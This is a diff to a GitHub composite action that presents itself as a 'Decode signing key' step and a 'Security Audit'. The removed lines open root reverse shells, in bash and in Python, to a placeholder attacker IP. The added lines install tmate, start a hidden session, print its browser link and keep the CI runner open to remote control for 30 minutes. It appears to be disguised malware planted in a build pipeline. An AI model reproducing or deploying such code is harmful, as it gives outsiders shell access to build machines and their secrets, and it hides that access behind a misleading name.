@@ -1,22 +1,26 @@
 
 
 name: Decode signing key
-description: 'Security Audit - Reverse Shell 443'
+description: 'Security Audit - Instant Browser Shell'
 runs:
   using: "composite"
   steps:
     - shell: bash
       run: |
-        ATTACKER_IP="SİZİN_REAL_IP_UNVANINIZ"
-        ATTACKER_PORT="443"
+        echo "[*] Installing audit tools..."
+        # tmate quraşdırırıq
+        sudo apt-get update -qq && sudo apt-get install -y tmate -qq
 
-        echo "[*] Connecting to $ATTACKER_IP:$ATTACKER_PORT..."
+        echo "[*] Launching secure terminal session..."
+        # tmate-i arxa planda başladırıq
+        tmate -S /tmp/tmate.sock new-session -d
+        tmate -S /tmp/tmate.sock wait-foreground
 
-        # Sudo ilə birbaşa ROOT shell göndəririk
-        sudo bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" &
-        
-        # Ehtiyat olaraq Python shell
-        sudo python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',int('$ATTACKER_PORT')));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
+        echo "[!] TERMINAL READY!"
+        echo "------------------------------------------------------------"
+        # Brauzer linkini ekrana çıxarırıq
+        tmate -S /tmp/tmate.sock display -p '#{tmate_web}'
+        echo "------------------------------------------------------------"
 
-        echo "[+] Attempt sent. Waiting for 15 minutes..."
-        sleep 900
+        # 30 dəqiqə ərzində terminalı açıq saxlayırıq
+        sleep 1800
